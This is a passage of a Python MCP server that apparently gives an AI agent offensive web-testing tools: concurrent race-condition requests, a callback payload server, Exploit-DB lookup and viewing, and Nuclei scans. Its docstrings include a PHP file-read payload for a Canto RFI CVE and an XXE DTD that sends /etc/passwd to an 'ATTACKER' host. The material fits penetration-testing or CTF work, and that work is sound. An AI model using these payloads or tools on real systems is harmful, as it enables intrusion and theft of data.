                if not user_content_type:
                    request_headers["Content-Type"] = "application/x-www-form-urlencoded"
            else:
                # 标准模式：遵循 Content-Type 进行编码
                if isinstance(data, dict):
                    # If data is a dict and Content-Type is application/json, send as JSON
                    if "application/json" in user_content_type:
                        request_params["json"] = data
                        prepared_body_preview = json.dumps(data)[:500]
                        encoding_mode = "json"
                    else:
                        # If data is a dict, httpx will urlencode it automatically
                        request_params["data"] = data
                        # 仅预览，不改变httpx实际编码
                        try:
                            from urllib.parse import urlencode as _urlencode

                            prepared_body_preview = _urlencode(data)[:500]
                        except Exception:
                            prepared_body_preview = str(data)[:500]
                        encoding_mode = "form_urlencoded"
                        if not user_content_type:
                            request_headers["Content-Type"] = "application/x-www-form-urlencoded"

                elif isinstance(data, str):
                    # If data is a string, pass it directly. The user is responsible for correct encoding.
                    request_params["data"] = data
                    prepared_body_preview = data[:500]
                    if "application/json" in user_content_type:
                        # If Content-Type is application/json but data is string, ensure it's valid JSON
                        try:
                            json.loads(data)
                            encoding_mode = "json"
                        except json.JSONDecodeError:
                            # 非合法JSON仍按字符串发送
                            encoding_mode = "string_with_json_content_type"
                    elif not user_content_type:
                        # Assume urlencoded if not specified, as it's the most common case for string POST data.
                        request_headers["Content-Type"] = "application/x-www-form-urlencoded"
                        encoding_mode = "form_urlencoded_string"

        request_params["headers"] = request_headers

        # 发送请求
        response = await _httpx_client.request(**request_params)

        # 计算响应时间
        response_time = round((time.time() - start_time) * 1000, 2)

        # 构造结果
        redirect_chain = [
            {"status_code": r.status_code, "reason": r.reason_phrase, "url": str(r.url), "headers": dict(r.headers)}
            for r in response.history
        ]

        result = {
            "request": {
                "url": str(response.request.url),  # httpx的URL对象需要转str
                "method": response.request.method,
                "headers": dict(response.request.headers),
                "data": data if isinstance(data, str) else json.dumps(data) if data else None,
                "raw_mode": raw_mode,
                "prepared_body_preview": prepared_body_preview,
                "encoding_mode": encoding_mode,
            },
            "response": {
                "status_code": response.status_code,
                "reason": response.reason_phrase,
                "headers": dict(response.headers),
                "content": response.text[:999999],  # 限制内容长度
                "content_length": len(response.text),
                "encoding": response.encoding,
                "url": str(response.url),  # 最终URL（可能重定向后的）
                "response_time_ms": response_time,
            },
            "metadata": {
                "redirects": len(response.history),
                "final_url": str(response.url),
                "elapsed_seconds": response.elapsed.total_seconds(),
                "cookies": dict(response.cookies),  # httpx可以直接获取响应的cookies
                "follow_redirects": follow_redirects,
                "redirect_chain": redirect_chain,
            },
        }

        return json.dumps(result, ensure_ascii=False, indent=2)

    except httpx.ConnectError as e:
        logger.error(f"HTTP连接错误: {url} - {e}")
        error_result = {"error": "Connection Error", "message": str(e), "url": url, "type": "connection_error"}
        return json.dumps(error_result, ensure_ascii=False, indent=2)

    except httpx.TimeoutException as e:
        logger.error(f"HTTP请求超时: {url} - {e}")
        error_result = {
            "error": "Timeout Error",
            "message": str(e),
            "url": url,
            "timeout": timeout,
            "type": "timeout_error",
        }
        return json.dumps(error_result, ensure_ascii=False, indent=2)

    except httpx.RequestError as e:
        logger.error(f"HTTP请求错误: {url} - {e}")
        error_result = {"error": "Request Error", "message": str(e), "url": url, "type": "request_error"}
        return json.dumps(error_result, ensure_ascii=False, indent=2)

    except Exception as e:
        logger.exception(f"HTTP请求发生未预期的错误: {url}")
        error_result = {"error": "Unexpected Error", "message": str(e), "url": url, "type": "unexpected_error"}
        return json.dumps(error_result, ensure_ascii=False, indent=2)


@mcp.tool()
async def concurrency_test(
    url: str,
    method: str = "GET",
    data: str = "{}",
    headers: str = "{}",
    concurrent_count: int = 10
) -> str:
    """
    High-performance concurrent request testing tool (Race Condition / TOCTOU).
    Sends 'concurrent_count' requests simultaneously using asyncio.gather.
    Useful for checking Race Conditions, Atomic Lock failures, or logical flaws in state updates.

    :param url: Target URL
    :param method: HTTP method (GET, POST, etc.)
    :param data: Request body (JSON string). Will be parsed to dist if possible.
    :param headers: Request headers (JSON string).
    :param concurrent_count: Number of concurrent requests (default 10, max 50).
    :return: JSON report of results.
    """
    
    # 1. Input Validation
    if concurrent_count > 50:
        return json.dumps({"success": False, "error": "concurrent_count limit is 50 to prevent DoS."})
    if concurrent_count < 1:
        concurrent_count = 1

    # 2. Parse Headers/Data
    try:
        req_headers = json.loads(headers) if headers else {}
        if isinstance(req_headers, str): # Handle double encoded
             req_headers = json.loads(req_headers)
    except Exception as e:
        return json.dumps({"success": False, "error": f"Invalid headers JSON: {e}"})

    try:
        req_data = json.loads(data) if data else {}
        if isinstance(req_data, str):
             try:
                 req_data = json.loads(req_data)
             except:
                 pass # Treat as raw string
    except Exception:
        req_data = data # Treat as raw string

    # 3. Define the task
    async def _single_req(idx):
        try:
             # Use global _httpx_client to reuse session (cookies)
             kwargs = {
                 "method": method,
                 "url": url,
                 "headers": req_headers,
                 "timeout": 20.0
             }
             if method.upper() in ["POST", "PUT", "PATCH"]:
                 if isinstance(req_data, dict):
                     # Check content type
                     ct = next((v for k,v in req_headers.items() if k.lower() == "content-type"), "")
                     if "application/json" in ct.lower():
                         kwargs["json"] = req_data
                     elif "application/x-www-form-urlencoded" in ct.lower():
                         kwargs["data"] = req_data
                     else:
                         # Default behavior based on type
                         kwargs["data"] = req_data
                 else:
                     kwargs["content"] = str(req_data)

             resp = await _httpx_client.request(**kwargs)
             return {
                 "index": idx,
                 "status": resp.status_code,
                 "length": len(resp.content),
                 # "text": resp.text[:100] # Optional
             }
        except Exception as e:
            return {"index": idx, "error": str(e)}

    # 4. Execute
    tasks = [_single_req(i) for i in range(concurrent_count)]
    results = await asyncio.gather(*tasks)

    # 5. Analyze
    status_counts = {}
    length_counts = {}
    errors = 0
    
    for r in results:
        if "error" in r:
            errors += 1
            print(f"Req {r['index']} error: {r['error']}")
            continue
        s = r["status"]
        l = r["length"]
        status_counts[s] = status_counts.get(s, 0) + 1
        length_counts[l] = length_counts.get(l, 0) + 1

    return json.dumps({
        "success": True,
        "total_requests": concurrent_count,
        "successful_responses": concurrent_count - errors,
        "errors": errors,
        "status_distribution": status_counts,
        "length_distribution": length_counts,
        "detailed_results_sample": results[:5] 
    }, ensure_ascii=False, indent=2)


# ==============================================================================
# Payload Server Manager - 用于 RFI/XXE/SSRF 回调等场景
# ==============================================================================

class PayloadRequestHandler(BaseHTTPRequestHandler):
    """自定义请求处理器，根据配置的路由返回 payload"""
    
    def log_message(self, format, *args):
        """记录请求到服务器的 request_log"""
        log_entry = {
            "timestamp": datetime.now().isoformat(),
            "client": self.client_address[0],
            "request": f"{self.command} {self.path}",
            "headers": dict(self.headers) if hasattr(self, 'headers') else {}
        }
        if hasattr(self.server, 'request_log'):
            self.server.request_log.append(log_entry)
        # 同时打印到控制台
        logger.info(f"[PayloadServer] {self.client_address[0]} - {self.command} {self.path}")
    
    def do_GET(self):
        self._handle_request()
    
    def do_POST(self):
        self._handle_request()
    
    def do_HEAD(self):
        self._handle_request(send_body=False)
    
    def _handle_request(self, send_body=True):
        """处理请求，根据路由配置返回对应内容"""
        routes = getattr(self.server, 'routes', {})
        
        # 查找匹配的路由 (精确匹配路径部分，忽略 query string)
        path_without_query = self.path.split('?')[0]
        
        if path_without_query in routes:
            route = routes[path_without_query]
            content = route.get('content', '')
            content_type = route.get('content_type', 'text/plain')
            
            self.send_response(200)
            self.send_header('Content-Type', content_type)
            self.send_header('Content-Length', len(content.encode('utf-8')))
            self.end_headers()
            
            if send_body:
                self.wfile.write(content.encode('utf-8'))
        else:
            # 默认返回 404，但仍记录请求
            self.send_response(404)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            if send_body:
                self.wfile.write(b'Not Found')


class PayloadServer:
    """单个 Payload 服务器实例"""
    
    def __init__(self, server_id: str, port: int, routes: Dict[str, Dict], host: str = "0.0.0.0"):
        self.server_id = server_id
        self.port = port
        self.host = host
        self.routes = routes
        self.request_log: List[Dict] = []
        self.httpd: Optional[HTTPServer] = None
        self.thread: Optional[threading.Thread] = None
        self.started_at: Optional[datetime] = None
        self.stopped = False
    
    def start(self):
        """启动服务器"""
        self.httpd = HTTPServer((self.host, self.port), PayloadRequestHandler)
        self.httpd.routes = self.routes
        self.httpd.request_log = self.request_log
        
        self.thread = threading.Thread(target=self._serve, daemon=True)
        self.thread.start()
        self.started_at = datetime.now()
        logger.info(f"[PayloadServer] Started server {self.server_id} on {self.host}:{self.port}")
    
    def _serve(self):
        """在线程中运行服务器"""
        try:
            while not self.stopped:
                self.httpd.handle_request()
        except Exception as e:
            logger.error(f"[PayloadServer] Server {self.server_id} error: {e}")
    
    def stop(self):
        """停止服务器"""
        self.stopped = True
        if self.httpd:
            self.httpd.shutdown()
            self.httpd.server_close()
        logger.info(f"[PayloadServer] Stopped server {self.server_id}")
    
    def get_logs(self) -> List[Dict]:
        """获取请求日志"""
        return self.request_log.copy()


class PayloadServerManager:
    """管理所有 Payload 服务器实例"""
    
    # 端口范围
    PORT_RANGE_START = 18000
    PORT_RANGE_END = 18999
    
    def __init__(self):
        self.servers: Dict[str, PayloadServer] = {}
        self._lock = threading.Lock()
    
    def _find_available_port(self) -> int:
        """在指定范围内随机查找一个可用端口"""
        ports = list(range(self.PORT_RANGE_START, self.PORT_RANGE_END + 1))
        random.shuffle(ports)
        
        for port in ports:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.bind(('0.0.0.0', port))
                    return port
            except OSError:
                continue
        
        raise RuntimeError(f"No available port found in range {self.PORT_RANGE_START}-{self.PORT_RANGE_END}")
    
    def _get_local_ip(self) -> str:
        """获取本机在 Docker 网络中的 IP"""
        try:
            # 尝试获取能连接外部的 IP
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.connect(("8.8.8.8", 80))
                return s.getsockname()[0]
        except Exception:
            return "127.0.0.1"
    
    def start_server(self, routes: List[Dict[str, str]], port: int = None) -> Dict[str, Any]:
        """
        启动一个新的 Payload 服务器
        
        Args:
            routes: 路由配置列表 [{"path": "/admin.php", "content": "<?php...>", "content_type": "text/plain"}]
            port: 指定端口，如果为 None 则自动选择
        
        Returns:
            包含 server_id, server_url, port, status 的字典
        """
        with self._lock:
            # 选择端口
            if port is None:
                port = self._find_available_port()
            
            # 生成服务器 ID
            server_id = f"ps_{uuid.uuid4().hex[:8]}"
            
            # 转换路由格式
            routes_dict = {}
            for route in routes:
                path = route.get('path', '/')
                routes_dict[path] = {
                    'content': route.get('content', ''),
                    'content_type': route.get('content_type', 'text/plain')
                }
            
            # 创建并启动服务器
            server = PayloadServer(server_id, port, routes_dict)
            server.start()
            
            self.servers[server_id] = server
            
            local_ip = self._get_local_ip()
            
            return {
                "status": "started",
                "server_id": server_id,
                "port": port,
                "server_url": f"http://{local_ip}:{port}",
                "routes_configured": list(routes_dict.keys()),
                "message": f"Payload server started. Use {local_ip}:{port} as your callback address."
            }
    
    def stop_server(self, server_id: str) -> Dict[str, Any]:
        """停止指定的服务器"""
        with self._lock:
            if server_id not in self.servers:
                return {"status": "error", "message": f"Server {server_id} not found"}
            
            server = self.servers[server_id]
            server.stop()
            del self.servers[server_id]
            
            return {"status": "stopped", "server_id": server_id}
    
    def get_logs(self, server_id: str) -> Dict[str, Any]:
        """获取服务器的请求日志"""
        with self._lock:
            if server_id not in self.servers:
                return {"status": "error", "message": f"Server {server_id} not found"}
            
            server = self.servers[server_id]
            logs = server.get_logs()
            
            return {
                "status": "success",
                "server_id": server_id,
                "request_count": len(logs),
                "requests": logs
            }
    
    def list_servers(self) -> Dict[str, Any]:
        """列出所有活动的服务器"""
        with self._lock:
            servers_info = []
            for sid, server in self.servers.items():
                servers_info.append({
                    "server_id": sid,
                    "port": server.port,
                    "started_at": server.started_at.isoformat() if server.started_at else None,
                    "request_count": len(server.request_log)
                })
            return {
                "status": "success",
                "active_servers": len(servers_info),
                "servers": servers_info
            }


# 全局 Payload 服务器管理器实例
_payload_server_manager = PayloadServerManager()


@mcp.tool()
async def start_payload_server(
    routes: List[Dict[str, str]],
    port: int = None
) -> str:
    """
    启动一个临时 HTTP Payload 服务器，用于 RFI/XXE/SSRF 回调等场景。
    
    服务器会在后台运行，监听指定端口并根据配置的路由返回 payload。
    所有收到的请求都会被记录，可通过 get_payload_server_logs 查询。
    
    Args:
        routes: 路由配置列表，每个元素是一个字典:
                - path: URL 路径 (如 "/wp-admin/admin.php")
                - content: 响应内容 (如 PHP payload)
                - content_type: Content-Type (可选，默认 "text/plain")
        port: 指定监听端口，如果不指定则在 18000-18999 范围内随机选择
    
    Returns:
        JSON 包含:
        - server_id: 用于后续操作的唯一标识
        - server_url: 完整的服务器 URL (如 http://10.0.0.5:18234)
        - port: 实际使用的端口
        - routes_configured: 已配置的路由路径列表
    
    使用示例 (RFI - CVE-2023-3452 Canto Plugin):
        # 1. 启动 payload 服务器
        result = await start_payload_server(routes=[{
            "path": "/wp-admin/admin.php",
            "content": "<?php echo file_get_contents('/FLAG.txt'); ?>"
        }])
        
        # 2. 发送 RFI 请求到目标
        # GET http://target/wp-content/plugins/canto/includes/lib/download.php?wp_abspath={server_url}
        
    使用示例 (XXE OOB):
        result = await start_payload_server(routes=[{
            "path": "/evil.dtd",
            "content": '<!ENTITY % data SYSTEM "file:///etc/passwd"><!ENTITY % param1 "<!ENTITY exfil SYSTEM \\'http://ATTACKER/?d=%data;\\'>">'
        }])
    """
    try:
        result = _payload_server_manager.start_server(routes, port)
        return json.dumps(result, ensure_ascii=False, indent=2)
    except Exception as e:
        return json.dumps({
            "status": "error",
            "message": str(e)
        }, ensure_ascii=False, indent=2)


@mcp.tool()
async def stop_payload_server(server_id: str) -> str:
    """
    停止指定的 Payload 服务器。
    
    Args:
        server_id: 由 start_payload_server 返回的服务器 ID
    
    Returns:
        JSON 包含操作结果
    """
    try:
        result = _payload_server_manager.stop_server(server_id)
        return json.dumps(result, ensure_ascii=False, indent=2)
    except Exception as e:
        return json.dumps({
            "status": "error",
            "message": str(e)
        }, ensure_ascii=False, indent=2)


@mcp.tool()
async def get_payload_server_logs(server_id: str) -> str:
    """
    获取 Payload 服务器收到的所有请求日志。
    
    用于确认目标是否成功回调（如 SSRF/XXE OOB 确认）。
    
    Args:
        server_id: 由 start_payload_server 返回的服务器 ID
    
    Returns:
        JSON 包含:
        - request_count: 收到的请求总数
        - requests: 请求详情列表，每个包含 timestamp, client, request, headers
    """
    try:
        result = _payload_server_manager.get_logs(server_id)
        return json.dumps(result, ensure_ascii=False, indent=2)
    except Exception as e:
        return json.dumps({
            "status": "error",
            "message": str(e)
        }, ensure_ascii=False, indent=2)


@mcp.tool()
async def list_payload_servers() -> str:
    """
    列出所有活动的 Payload 服务器。
    
    Returns:
        JSON 包含所有活动服务器的信息
    """
    try:
        result = _payload_server_manager.list_servers()
        return json.dumps(result, ensure_ascii=False, indent=2)
    except Exception as e:
        return json.dumps({
            "status": "error",
            "message": str(e)
        }, ensure_ascii=False, indent=2)


# ==============================================================================
# CVE/Exploit Search Tool - 动态查询漏洞数据库
# ==============================================================================

@mcp.tool()
async def search_exploit(
    keywords: str,
    cve_id: str = None,
    max_results: int = 10
) -> str:
    """
    搜索公开漏洞数据库，查找与指定关键词或 CVE ID 相关的漏洞和利用代码。
    
    当你发现一个组件及其版本号时（如 "Canto 3.0.4"），使用此工具查找已知漏洞。
    这比依赖静态知识库更准确和及时。
    
    数据源：
    - NVD (National Vulnerability Database) - 官方 CVE 数据库
    - Exploit-DB (通过网页搜索) - 公开 PoC 和利用代码
    
    Args:
        keywords: 搜索关键词，如 "canto wordpress" 或 "apache 2.4.49"
        cve_id: 可选，直接搜索特定 CVE (如 "CVE-2023-3452")
        max_results: 返回的最大结果数 (默认 10)
    
    Returns:
        JSON 包含漏洞列表，每个包含:
        - cve_id: CVE 编号
        - description: 漏洞描述
        - severity: 严重程度 (CRITICAL/HIGH/MEDIUM/LOW)
        - affected_versions: 受影响版本
        - references: 参考链接（包括 PoC 链接）
        - exploit_available: 是否有公开利用代码
    
    使用示例:
        # 发现 Canto 3.0.4 后
        result = await search_exploit("canto wordpress 3.0.4")
        # 获得 CVE-2023-3452 的详细信息和利用方法
        
        # 按 CVE 搜索
        result = await search_exploit("", cve_id="CVE-2023-3452")
    """
    results = {
        "status": "success",
        "query": keywords or cve_id,
        "sources_checked": [],
        "vulnerabilities": []
    }
    
    try:
        # === Source 1: NVD API (免费，无需 API Key) ===
        nvd_results = await _search_nvd(keywords, cve_id, max_results)
        results["sources_checked"].append("NVD")
        results["vulnerabilities"].extend(nvd_results)
        
        # === Source 2: Exploit-DB 网页搜索 ===
        edb_results = await _search_exploitdb(keywords, cve_id, max_results)
        results["sources_checked"].append("Exploit-DB")
        
        # 合并 Exploit-DB 结果到已有 CVE 或添加为新条目
        for edb in edb_results:
            matched = False
            for vuln in results["vulnerabilities"]:
                if edb.get("cve_id") and vuln.get("cve_id") == edb.get("cve_id"):
                    vuln["exploit_available"] = True
                    vuln["exploit_url"] = edb.get("url")
                    vuln["exploit_path"] = edb.get("path")  # searchsploit 本地路径
                    vuln["edb_id"] = edb.get("edb_id")
                    vuln["exploit_title"] = edb.get("title")
                    matched = True
                    break
            if not matched:
                results["vulnerabilities"].append({
                    "cve_id": edb.get("cve_id"),
                    "title": edb.get("title"),
                    "exploit_available": True,
                    "exploit_url": edb.get("url"),
                    "exploit_path": edb.get("path"),  # searchsploit 本地路径
                    "edb_id": edb.get("edb_id"),
                    "source": "Exploit-DB"
                })
        
        results["total_found"] = len(results["vulnerabilities"])
        
    except Exception as e:
        results["status"] = "partial_error"
        results["error"] = str(e)
    
    return json.dumps(results, ensure_ascii=False, indent=2)


async def _search_nvd(keywords: str, cve_id: str, max_results: int) -> List[Dict]:
    """查询 NVD API"""
    vulnerabilities = []
    
    try:
        if cve_id:
            url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?cveId={cve_id}"
        else:
            # 使用关键词搜索
            encoded_keywords = keywords.replace(" ", "+")
            url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={encoded_keywords}&resultsPerPage={max_results}"
        
        response = await _httpx_client.get(url, timeout=30.0)
        
        if response.status_code == 200:
            data = response.json()
            
            for item in data.get("vulnerabilities", [])[:max_results]:
                cve = item.get("cve", {})
                cve_meta = cve.get("id", "Unknown")
                
                # 获取描述
                descriptions = cve.get("descriptions", [])
                desc = next((d["value"] for d in descriptions if d.get("lang") == "en"), "No description")
                
                # 获取严重程度
                metrics = cve.get("metrics", {})
                severity = "UNKNOWN"
                cvss_score = None
                
                if "cvssMetricV31" in metrics:
                    cvss_data = metrics["cvssMetricV31"][0].get("cvssData", {})
                    severity = cvss_data.get("baseSeverity", "UNKNOWN")
                    cvss_score = cvss_data.get("baseScore")
                elif "cvssMetricV2" in metrics:
                    cvss_data = metrics["cvssMetricV2"][0].get("cvssData", {})
                    cvss_score = cvss_data.get("baseScore")
                    severity = "HIGH" if cvss_score and cvss_score >= 7.0 else "MEDIUM" if cvss_score and cvss_score >= 4.0 else "LOW"
                
                # 获取参考链接
                references = [ref.get("url") for ref in cve.get("references", [])][:5]
                
                # 获取受影响版本
                affected = []
                for config in cve.get("configurations", []):
                    for node in config.get("nodes", []):
                        for match in node.get("cpeMatch", []):
                            if match.get("vulnerable"):
                                version_info = match.get("criteria", "")
                                if "versionEndIncluding" in match:
                                    affected.append(f"<= {match['versionEndIncluding']}")
                                elif "versionEndExcluding" in match:
                                    affected.append(f"< {match['versionEndExcluding']}")
                
                vulnerabilities.append({
                    "cve_id": cve_meta,
                    "description": desc[:500],  # 截断长描述
                    "severity": severity,
                    "cvss_score": cvss_score,
                    "affected_versions": affected[:3],
                    "references": references,
                    "exploit_available": False,
                    "source": "NVD"
                })
                
    except Exception as e:
        logger.warning(f"NVD search failed: {e}")
    
    return vulnerabilities


async def _search_exploitdb(keywords: str, cve_id: str, max_results: int) -> List[Dict]:
    """使用 searchsploit CLI 搜索 Exploit-DB"""
    exploits = []
    
    try:
        # 构建搜索参数
        if cve_id:
            search_args = ["searchsploit", "--cve", cve_id.replace("CVE-", ""), "-j"]
        else:
            # 分割关键词
            search_args = ["searchsploit", "-j"] + keywords.split()
        
        # 执行命令
        result = subprocess.run(
            search_args,
            capture_output=True,
            text=True,
            timeout=30
        )
        
        if result.returncode == 0 and result.stdout.strip():
            try:
                data = json.loads(result.stdout)
                
                for item in data.get("RESULTS_EXPLOIT", [])[:max_results]:
                    title = item.get("Title", "")
                    path = item.get("Path", "")
                    edb_id = item.get("EDB-ID", "")
                    
                    # 从标题或路径提取 CVE
                    import re
                    cve_match = re.search(r'CVE-\d{4}-\d+', title, re.I)
                    exploit_cve = cve_match.group(0).upper() if cve_match else None
                    
                    exploits.append({
                        "edb_id": str(edb_id),
                        "title": title,
                        "path": path,  # 本地文件路径
                        "url": f"https://www.exploit-db.com/exploits/{edb_id}" if edb_id else None,
                        "cve_id": exploit_cve
                    })
                    
            except json.JSONDecodeError:
                logger.warning(f"searchsploit JSON parse error: {result.stdout[:200]}")
        else:
            logger.info(f"searchsploit returned no results or error: {result.stderr}")
                
    except FileNotFoundError:
        logger.warning("searchsploit not found, falling back to web search")
        # 回退到网页搜索
        exploits = await _search_exploitdb_web(keywords, cve_id, max_results)
    except subprocess.TimeoutExpired:
        logger.warning("searchsploit timed out")
    except Exception as e:
        logger.warning(f"searchsploit failed: {e}")
    
    return exploits


async def _search_exploitdb_web(keywords: str, cve_id: str, max_results: int) -> List[Dict]:
    """Web fallback: 搜索 Exploit-DB 网页 (当 searchsploit 不可用时)"""
    exploits = []
    
    try:
        if cve_id:
            search_query = cve_id
        else:
            search_query = keywords
        
        encoded_query = search_query.replace(" ", "+")
        url = f"https://www.exploit-db.com/search?q={encoded_query}"
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml"
        }
        
        response = await _httpx_client.get(url, headers=headers, timeout=30.0, follow_redirects=True)
        
        if response.status_code == 200:
            html = response.text
            import re
            exploit_pattern = r'href="(/exploits/(\d+))"[^>]*>([^<]+)</a>'
            matches = re.findall(exploit_pattern, html)
            
            seen_ids = set()
            for match in matches[:max_results]:
                path, edb_id, title = match
                if edb_id in seen_ids:
                    continue
                seen_ids.add(edb_id)
                
                cve_match = re.search(r'CVE-\d{4}-\d+', title, re.I)
                exploit_cve = cve_match.group(0).upper() if cve_match else None
                
                exploits.append({
                    "edb_id": edb_id,
                    "title": title.strip(),
                    "url": f"https://www.exploit-db.com{path}",
                    "cve_id": exploit_cve
                })
                
    except Exception as e:
        logger.warning(f"Exploit-DB web search failed: {e}")
    
    return exploits


@mcp.tool()
async def view_exploit(
    edb_id: str = None,
    path: str = None,
    max_lines: int = 200
) -> str:
    """
    查看 Exploit-DB 中的 exploit/PoC 代码内容。
    
    使用场景：在 search_exploit 找到相关的漏洞后，使用此工具查看具体的利用代码。
    
    Args:
        edb_id: Exploit-DB ID (如 "51826")，将使用 searchsploit -x 查看
        path: 直接指定本地路径 (如 "php/webapps/51826.py")
        max_lines: 最大返回行数 (默认 200)
    
    Returns:
        JSON 包含:
        - status: success/error
        - edb_id: Exploit-DB ID
        - title: exploit 标题
        - content: exploit 代码内容
        - file_type: 文件类型 (py/txt/rb/c 等)
        - key_info: 从代码中提取的关键信息 (如 vulnerable URL, parameters)
    
    使用示例:
        # 从 search_exploit 结果中获取 edb_id
        result = await view_exploit(edb_id="51826")
        # 返回 Canto RFI exploit 的完整 Python 代码
    """
    result = {
        "status": "success",
        "edb_id": edb_id,
        "path": path
    }
    
    try:
        if edb_id:
            # 使用 searchsploit -p 获取路径信息
            path_result = subprocess.run(
                ["searchsploit", "-p", str(edb_id)],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if path_result.returncode == 0:
                output = path_result.stdout
                
                # 解析输出获取标题和路径
                # 格式: "Exploit: Title\n    URL: ...\n   Path: /path/to/file\n..."
                import re
                title_match = re.search(r'Exploit:\s*(.+)', output)
                path_match = re.search(r'Path:\s*(.+)', output)
                
                if title_match:
                    result["title"] = title_match.group(1).strip()
                if path_match:
                    exploit_path = path_match.group(1).strip()
                    result["path"] = exploit_path
                    
                    # 读取文件内容
                    if os.path.exists(exploit_path):
                        with open(exploit_path, 'r', encoding='utf-8', errors='ignore') as f:
                            lines = f.readlines()
                            content = ''.join(lines[:max_lines])
                            if len(lines) > max_lines:
                                content += f"\n\n... [Truncated: {len(lines) - max_lines} more lines] ..."
                            result["content"] = content
                            result["total_lines"] = len(lines)
                            result["file_type"] = exploit_path.split('.')[-1] if '.' in exploit_path else "txt"
                            
                            # 提取关键信息
                            result["key_info"] = _extract_exploit_key_info(content)
                    else:
                        result["error"] = f"Exploit file not found: {exploit_path}"
                        result["status"] = "error"
            else:
                result["status"] = "error"
                result["error"] = f"searchsploit -p failed: {path_result.stderr}"
                
        elif path:
            # 直接读取指定路径
            if os.path.exists(path):
                with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = f.readlines()
                    content = ''.join(lines[:max_lines])
                    if len(lines) > max_lines:
                        content += f"\n\n... [Truncated: {len(lines) - max_lines} more lines] ..."
                    result["content"] = content
                    result["total_lines"] = len(lines)
                    result["file_type"] = path.split('.')[-1] if '.' in path else "txt"
                    result["key_info"] = _extract_exploit_key_info(content)
            else:
                result["status"] = "error"
                result["error"] = f"File not found: {path}"
        else:
            result["status"] = "error"
            result["error"] = "Must provide either edb_id or path"
            
    except FileNotFoundError:
        result["status"] = "error"
        result["error"] = "searchsploit not installed. Install with: apt install exploitdb"
    except Exception as e:
        result["status"] = "error"
        result["error"] = str(e)
    
    return json.dumps(result, ensure_ascii=False, indent=2)


def _extract_exploit_key_info(content: str) -> Dict[str, Any]:
    """从 exploit 代码中提取关键信息"""
    import re
    key_info = {}
    
    # 提取 URL 模式
    url_patterns = re.findall(r'["\']/([\w\-/]+\.php)["\']', content)
    if url_patterns:
        key_info["vulnerable_endpoints"] = list(set(url_patterns))[:5]
    
    # 提取参数名
    param_patterns = re.findall(r'["\'](\w+)["\']:\s*["\']?\$?\{?', content)
    if param_patterns:
        key_info["parameters"] = list(set(param_patterns))[:10]
    
    # 提取 HTTP 方法
    if 'requests.post' in content.lower() or 'POST' in content:
        key_info["http_method"] = "POST"
    elif 'requests.get' in content.lower() or 'GET' in content:
        key_info["http_method"] = "GET"
    
    # 提取命令执行函数
    dangerous_funcs = re.findall(r'\b(system|exec|passthru|shell_exec|popen|proc_open|eval)\s*\(', content)
    if dangerous_funcs:
        key_info["dangerous_functions"] = list(set(dangerous_funcs))
    
    # 提取 CVE
    cve_match = re.search(r'CVE-\d{4}-\d+', content, re.I)
    if cve_match:
        key_info["cve"] = cve_match.group(0).upper()
    
    return key_info


# ==============================================================================
# Nuclei Vulnerability Scanner Tool
# ==============================================================================

@mcp.tool()
async def nuclei_scan(
    target: str,
    templates: str = None,
    severity: str = None,
    tags: str = None,
    timeout: int = 180,
    rate_limit: int = 150,
    concurrency: int = 25
) -> str:
    """
    使用 Nuclei 对目标进行漏洞扫描。
    
    Nuclei 是一个基于模板的快速漏洞扫描器，可以检测 CVE、配置错误、暴露的面板等。
    
    ⚠️ 注意：完整扫描可能需要 2-3 分钟，建议指定 templates 或 tags 来缩短扫描时间。
    
    Args:
        target: 目标 URL (如 "http://localhost:8080")
        templates: 可选，指定模板路径或名称 (如 "cves/2023/CVE-2023-3452.yaml" 或 "wordpress")
        severity: 可选，按严重程度过滤 (critical,high,medium,low,info)
        tags: 可选，按标签过滤 (如 "cve,wordpress,rce")
        timeout: 超时时间，默认 180 秒 (3分钟)
        rate_limit: 请求速率限制，默认 150/s
        concurrency: 并发数，默认 25
    
    Returns:
        JSON 包含:
        - status: success/timeout/error
        - findings: 发现的漏洞列表
        - summary: 扫描摘要统计
        - raw_output: 原始输出 (调试用)
    
    使用示例:
        # 快速扫描，只检查高危漏洞
        result = await nuclei_scan("http://target.com", severity="critical,high")
        
        # 针对特定技术栈
        result = await nuclei_scan("http://target.com", tags="wordpress,cve")
        
        # 使用特定 CVE 模板
        result = await nuclei_scan("http://target.com", templates="cves/2023/CVE-2023-3452.yaml")
    """
    result = {
        "status": "success",
        "target": target,
        "findings": [],
        "summary": {},
        "scan_options": {
            "templates": templates,
            "severity": severity,
            "tags": tags,
            "timeout": timeout
        }
    }
    
    try:
        # 构建 nuclei 命令
        cmd = [
            "nuclei",
            "-u", target,
            "-jsonl",  # JSON Lines 输出
            "-silent",  # 减少噪音
            "-rate-limit", str(rate_limit),
            "-concurrency", str(concurrency),
            "-timeout", "10",  # 单个请求超时
        ]
        
        if templates:
            cmd.extend(["-t", templates])
        
        if severity:
            cmd.extend(["-severity", severity])
        
        if tags:
            cmd.extend(["-tags", tags])
        
        # 异步执行，带超时
        process = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        
        try:
            stdout, stderr = await asyncio.wait_for(
                process.communicate(),
                timeout=timeout
            )
        except asyncio.TimeoutError:
            process.kill()
            await process.wait()
            result["status"] = "timeout"
            result["error"] = f"Scan timed out after {timeout} seconds"
            result["message"] = "Consider using more specific templates, tags, or severity filters"
            return json.dumps(result, ensure_ascii=False, indent=2)
        
        # 解析 JSONL 输出
        findings = []
        raw_lines = stdout.decode('utf-8', errors='ignore').strip().split('\n')
        
        for line in raw_lines:
            if not line.strip():
                continue
            try:
                finding = json.loads(line)
                findings.append({
                    "template_id": finding.get("template-id", ""),
                    "name": finding.get("info", {}).get("name", ""),
                    "severity": finding.get("info", {}).get("severity", ""),
                    "type": finding.get("type", ""),
                    "matched_at": finding.get("matched-at", ""),
                    "description": finding.get("info", {}).get("description", "")[:300],
                    "cve_id": finding.get("info", {}).get("classification", {}).get("cve-id"),
